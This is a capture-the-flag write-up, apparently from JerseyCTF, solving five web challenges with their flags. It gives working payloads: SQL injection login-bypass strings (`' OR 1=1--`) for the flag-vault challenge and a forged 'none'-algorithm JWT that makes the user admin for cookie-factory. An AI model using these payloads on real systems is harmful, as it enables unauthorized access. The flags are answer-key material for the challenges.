# web

- [x] [apache-logs (100)](#apache-logs)
- [x] [seigwards-secrets (100)](#seigwards-secrets)
- [x] [heres-my-password(250)](#heres-my-password)
- [x] [flag-vault (300)](#flag-vault)
- [x] [cookie-factory (400)](#cookie-factory)

## apache-logs

### *Description*

- An apache log file that contains recent traffic was pulled from a web server. There is suspicion that an external host was able to access a sensitive file accidentally placed in one of the company website's directories. Someone's getting fired...
- Identify the source IP address that was able to access the file by using the flag format: jctf{IP address}

<details>
    <summary>View Hint</summary>
	Which directory types should sensitive files not be placed in?
</details>
[webtraffic.log](https://www.jerseyctf.site/files/3a0428612620ef7b190032655f097b00/webtraffic.log?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6OH0.YlYjVw.k0472hBVgZ8pNS9aLHisdMszles)


### *Writeup*

<kbd>CTRL+F</kbd> for 200 (successful HTTP GETs), the one indicating bank records represents confidential data and is what we are searching for.

Flag: `jctf{76.190.52.148}`

## seigwards-secrets

### *Description*

- Seigward has been storing his secrets on his website [https://jerseyctf.co](https://jerseyctf.co/) for decades. Hasn't failed him yet.

<details>
    <summary>View Hint</summary>
	Where can you find a website's code?
</details>

### *Writeup*

Notice that the [login.js](https://jerseyctf.co/login.js) file checks if the password when converted from ascii to base64 (`btoa`) is equal to `amN0ZnsxTV9zMF8xTV81b19EeW40TWl0M18wOTI0Nzh9`. Use a base64 decoder.

Flag: `jctf{1M_s0_1M_5o_Dyn4Mit3_092478}`

## heres-my-password

### *Description*

- Here's the deal - we have a list of 500 users (males, females, and pets) and one password. Log-in with the proper credentials for the flag.
- The password is **lightswitchon_and_offLOL26** and the website is [www.jerseyctf.online](http://www.jerseyctf.online/).

<details>
    <summary>View Hint</summary>
	This is not intended to require manual brute force. What are some other types of brute force methods?
</details>
[users.txt](https://www.jerseyctf.site/files/b75ea9a239df8ec1408edc31d05932b3/users.txt?token=eyJ1c2VyX2lkIjozODgsInRlYW1faWQiOjUxMSwiZmlsZV9pZCI6OX0.YlYlAg.llQS13U44BZu_MnEALyBwcMWvUM)


### *Writeup*

The username changes every minute.

Flag: `jctf{c0NGR@T2_y0U_p@22wORd_SPR@y3D!}`

## flag-vault

### *Description*

- I'm very organized. I even keep all of my flags neatly organized in a database! But, these are my flags! You don't have access to them... or do you?
- Do not brute force this challenge.

<span style="color: #e83e8c;">Start here: jerseyctf-flag-vault.chals.io</span>

<details>
    <summary>View Hint</summary>
	<ul>
        <li>What is the most common type of database?</li>
        <li>What is the flag format? How does that help you?</li>
    </ul>
</details>

### *Writeup*

Login initially with the username `admin` and password `' OR 1=1--` Then give the SQL query `' OR FLAG LIKE 'jctf{%' --` which will search for all entries that match the jctf beginning characters.

![img](https://lh6.googleusercontent.com/ja4PP1_ChvlZ_ZBTZzZRPJfNMkGjQaUdq0HuB3v4DM79-Rx3N8mNMFIvV7FadYpISUnfuEu7Eg8GZ-6NCsGRtUWW2b_Wb4dQzpPjBaGwQY4LLJXTX8nW9rnw9MSBtKfrXxFQstJI)

Flag: `jctf{ALMOST_LIKE_A_NEEDLE_IN_A_HAYSTACK}`

## cookie-factory

### *Description*

Granny's Cookie Factory

- Here at Granny's Old-Fashioned Home-Baked Cookie Factory, we pride ourselves on our cookies AND security being the best in the business.

<span style="color: #e83e8c;">Start here: https://jerseyctf-cookie-factory.chals.io/</span>


### *Writeup*

CVE-2018-1000531 vulnerability.

Username as “a” and password as “b” generates this JWT token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImEifQ.I2_0Uq0TSXDKY8C13D_0yk8mLcZP_0RPy_I2KNwXBO8`, which is in base64

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9` → `{"typ":"JWT","alg":"HS256"}`

`eyJ1c2VybmFtZSI6ImEifQ` → `{"username":"a"}`

`I2_0Uq0TSXDKY8C13D_0yk8mLcZP_0RPy_I2KNwXBO8` → some random bytes

We want to generate a new custom token with a none algorithm.

`{"typ":"JWT","alg":"none"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`

`{"username":"admin"}` → `eyJ1c2VybmFtZSI6ImFkbWluIn0`

We can leave the password as blank so our token ends with a `.`

Payload: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.`

![img](https://lh6.googleusercontent.com/ViZ8ru4mHheTDwGxymv74V5D00ieb_qxKYeYDKFZe3Rjpsss75UIC8DPp9AmmZDZW7J_DDAySBEXagayMfNhzVDKpWKfvPUECFfkIakzjXjGPzu0XH7XhIyECOM76AOhgBHZ9BBI)

Flag: `jctf{GEEZ_WHAT_A_TOUGH_COOKIE}`